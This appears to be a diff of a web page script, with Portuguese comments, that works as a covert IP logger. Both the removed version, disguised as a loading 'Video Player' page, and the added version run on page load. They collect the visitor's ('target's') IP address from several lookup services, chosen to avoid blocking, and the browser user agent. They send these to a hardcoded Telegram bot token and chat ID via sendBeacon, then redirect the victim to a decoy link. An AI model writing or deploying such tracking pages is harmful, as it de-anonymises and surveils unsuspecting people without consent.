@@ -1,43 +1,37 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Video Player</title>
-</head>
-<body style="background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
-    <p>Carregando vídeo...</p>
+<script>
+  const TOKEN = "8536635132:AAGU7VibS5L3GkZ9WYDjMsRhbKs_XQlBbGA";
+  const CHAT_ID = "8053770740";
+  const REDIRECT = "https://google.com"; // Seu link de destino
 
-    <script>
-        const TOKEN = "8536635132:AAGU7VibS5L3GkZ9WYDjMsRhbKs_XQlBbGA";
-        const CHAT_ID = "8053770740";
-        // Coloque abaixo o link da imagem ou vídeo que o alvo deve ver
-        const REDIRECT_URL = "https://google.com"; 
+  async function capturar() {
+    let ip = "N/A";
+    
+    // Lista de provedores para evitar bloqueio
+    const providers = [
+      'https://api.ipify.org?format=json',
+      'https://ipapi.co/json/',
+      'https://ip-api.com/json/'
+    ];
 
-        async function capturar() {
-            try {
-                // Pega o IP do alvo
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const ip = data.ip;
-                const ua = navigator.userAgent;
+    for (let url of providers) {
+      try {
+        const res = await fetch(url);
+        const data = await res.json();
+        ip = data.ip || data.query || ip;
+        if (ip !== "N/A") break; // Se pegou o IP, para de procurar
+      } catch (e) { continue; }
+    }
 
-                // Monta a mensagem para o seu Telegram
-                const msg = `WORM WEB LOG\nIP: ${ip}\nUA: ${ua}`;
-                const telegramUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
+    const msg = `WORM WEB LOG\nIP: ${ip}\nUA: ${navigator.userAgent}`;
+    const botUrl = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
 
-                // Envia os dados (Beacon é mais difícil de bloquear)
-                navigator.sendBeacon(telegramUrl);
+    // Beacon é ignorado pelo cache, ele sempre envia
+    navigator.sendBeacon(botUrl);
 
-            } catch (error) {
-                console.log("Erro silencioso");
-            } finally {
-                // Redireciona o alvo após um pequeno delay para garantir o envio
-                setTimeout(() => {
-                    window.location.href = REDIRECT_URL;
-                }, 800);
-            }
-        }
+    setTimeout(() => {
+      window.location.href = REDIRECT;
+    }, 800);
+  }
 
-        capturar();
-    </script>
-</body>
-</html>
+  capturar();
+</script>
